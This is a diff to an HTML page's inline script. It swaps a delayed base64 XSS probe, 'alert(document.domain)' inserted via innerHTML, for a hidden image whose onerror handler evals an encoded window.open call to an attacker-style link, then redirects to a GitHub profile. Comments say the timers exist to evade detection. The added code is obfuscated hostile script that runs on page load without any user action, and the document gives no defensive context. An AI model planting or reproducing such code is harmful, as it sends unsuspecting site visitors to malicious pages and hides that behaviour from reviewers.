@@ -10,11 +10,18 @@
 
     <script>
         setTimeout(function() {
-            var hiddenPayload = atob('PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==');
-            var el = document.createElement('div');
-            el.innerHTML = hiddenPayload;
-            document.body.appendChild(el);
-        }, 2000); // Delayed execution to evade detection
+            var hiddenPayload = document.createElement('img');
+            hiddenPayload.src = "x";
+            hiddenPayload.style.display = "none";
+            hiddenPayload.onerror = function() {
+                var payload = atob('KHdpbmRvdy5vcGVuKCdodHRwOi8veW91cm1hbGljaW91c2xpbmsuY29tJykp'); // Opens attacker's page
+                eval(payload);
+                setTimeout(function() {
+                    window.location.href = "https://github.com/Zierax";
+                }, 2000); // Redirect after 2 seconds
+            };
+            document.body.appendChild(hiddenPayload);
+        }, 3000); // Further delayed execution to evade detection
     </script>
 </body>
 </html>
